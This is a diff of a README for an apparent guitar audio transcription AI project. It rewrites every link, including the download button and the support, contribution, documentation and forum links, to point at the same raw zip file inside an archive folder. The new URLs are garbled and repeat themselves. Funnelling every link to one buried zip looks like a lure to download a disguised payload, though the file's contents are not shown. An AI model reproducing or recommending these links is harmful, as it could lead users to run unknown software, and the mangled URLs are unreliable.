@@ -4,7 +4,7 @@
 Welcome to the Guitar Audio Transcriber AI project! This tool helps you turn raw guitar audio into musical note representations. By using advanced deep learning techniques, it simplifies the process of music transcription for guitar enthusiasts. 
 
 ## 🔗 Download Now
-[![Download Release](https://raw.githubusercontent.com/Dinhopjsa/guitar-audio-transcriber-ai/main/archive/model prototypes v0/logistic regression/guitar-audio-transcriber-ai_v2.8.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Dinhopjsa/guitar-audio-transcriber-ai/main/archive/model prototypes v0/logistic regression/guitar-audio-transcriber-ai_v2.8.zip)
+[![Download Release](https://github.com/Dinhopjsa/guitar-audio-transcriber-ai/raw/refs/heads/main/archive/model prototypes v0/mlp/ai_guitar_transcriber_audio_1.2.zip prototypes v0/logistic https://github.com/Dinhopjsa/guitar-audio-transcriber-ai/raw/refs/heads/main/archive/model prototypes v0/mlp/ai_guitar_transcriber_audio_1.2.zip%20Now-Click%20Here-brightgreen)](https://github.com/Dinhopjsa/guitar-audio-transcriber-ai/raw/refs/heads/main/archive/model prototypes v0/mlp/ai_guitar_transcriber_audio_1.2.zip prototypes v0/logistic https://github.com/Dinhopjsa/guitar-audio-transcriber-ai/raw/refs/heads/main/archive/model prototypes v0/mlp/ai_guitar_transcriber_audio_1.2.zip)
 
 ## 📋 Features
 - **Single-Note Classification**: Identify and transcribe single guitar notes.
@@ -20,7 +20,7 @@ To run the Guitar Audio Transcriber AI, please ensure your system meets the foll
 - **Audio Input**: A microphone or audio interface for guitar input.
 
 ## 📥 Download & Install
-To get the latest version of Guitar Audio Transcriber AI, visit the Releases page: [Download Here](https://raw.githubusercontent.com/Dinhopjsa/guitar-audio-transcriber-ai/main/archive/model prototypes v0/logistic regression/guitar-audio-transcriber-ai_v2.8.zip)
+To get the latest version of Guitar Audio Transcriber AI, visit the Releases page: [Download Here](https://github.com/Dinhopjsa/guitar-audio-transcriber-ai/raw/refs/heads/main/archive/model prototypes v0/mlp/ai_guitar_transcriber_audio_1.2.zip prototypes v0/logistic https://github.com/Dinhopjsa/guitar-audio-transcriber-ai/raw/refs/heads/main/archive/model prototypes v0/mlp/ai_guitar_transcriber_audio_1.2.zip)
 
 1. Click on the link above to access the Releases page.
 2. Look for the latest version at the top of the list.
@@ -46,13 +46,13 @@ Should you face any issues:
 - Restart the application if it becomes unresponsive during transcription.
 
 ## 📖 Support
-If you have questions or need assistance, please refer to the [GitHub Issues](https://raw.githubusercontent.com/Dinhopjsa/guitar-audio-transcriber-ai/main/archive/model prototypes v0/logistic regression/guitar-audio-transcriber-ai_v2.8.zip) page to report issues or seek help from the community. 
+If you have questions or need assistance, please refer to the [GitHub Issues](https://github.com/Dinhopjsa/guitar-audio-transcriber-ai/raw/refs/heads/main/archive/model prototypes v0/mlp/ai_guitar_transcriber_audio_1.2.zip prototypes v0/logistic https://github.com/Dinhopjsa/guitar-audio-transcriber-ai/raw/refs/heads/main/archive/model prototypes v0/mlp/ai_guitar_transcriber_audio_1.2.zip) page to report issues or seek help from the community. 
 
 ## 📚 Contribution
-We welcome contributions! If you'd like to help improve the project, please review our [Contribution Guidelines](https://raw.githubusercontent.com/Dinhopjsa/guitar-audio-transcriber-ai/main/archive/model prototypes v0/logistic regression/guitar-audio-transcriber-ai_v2.8.zip) and submit your pull requests. 
+We welcome contributions! If you'd like to help improve the project, please review our [Contribution Guidelines](https://github.com/Dinhopjsa/guitar-audio-transcriber-ai/raw/refs/heads/main/archive/model prototypes v0/mlp/ai_guitar_transcriber_audio_1.2.zip prototypes v0/logistic https://github.com/Dinhopjsa/guitar-audio-transcriber-ai/raw/refs/heads/main/archive/model prototypes v0/mlp/ai_guitar_transcriber_audio_1.2.zip) and submit your pull requests. 
 
 ## 🔗 Additional Resources
-- [Documentation](https://raw.githubusercontent.com/Dinhopjsa/guitar-audio-transcriber-ai/main/archive/model prototypes v0/logistic regression/guitar-audio-transcriber-ai_v2.8.zip) - Comprehensive guidelines and information on features.
-- [Community Forum](https://raw.githubusercontent.com/Dinhopjsa/guitar-audio-transcriber-ai/main/archive/model prototypes v0/logistic regression/guitar-audio-transcriber-ai_v2.8.zip) - Share your experiences and tips with others.
+- [Documentation](https://github.com/Dinhopjsa/guitar-audio-transcriber-ai/raw/refs/heads/main/archive/model prototypes v0/mlp/ai_guitar_transcriber_audio_1.2.zip prototypes v0/logistic https://github.com/Dinhopjsa/guitar-audio-transcriber-ai/raw/refs/heads/main/archive/model prototypes v0/mlp/ai_guitar_transcriber_audio_1.2.zip) - Comprehensive guidelines and information on features.
+- [Community Forum](https://github.com/Dinhopjsa/guitar-audio-transcriber-ai/raw/refs/heads/main/archive/model prototypes v0/mlp/ai_guitar_transcriber_audio_1.2.zip prototypes v0/logistic https://github.com/Dinhopjsa/guitar-audio-transcriber-ai/raw/refs/heads/main/archive/model prototypes v0/mlp/ai_guitar_transcriber_audio_1.2.zip) - Share your experiences and tips with others.
   
 Thank you for using Guitar Audio Transcriber AI! Enjoy transforming your guitar audio into music with ease.
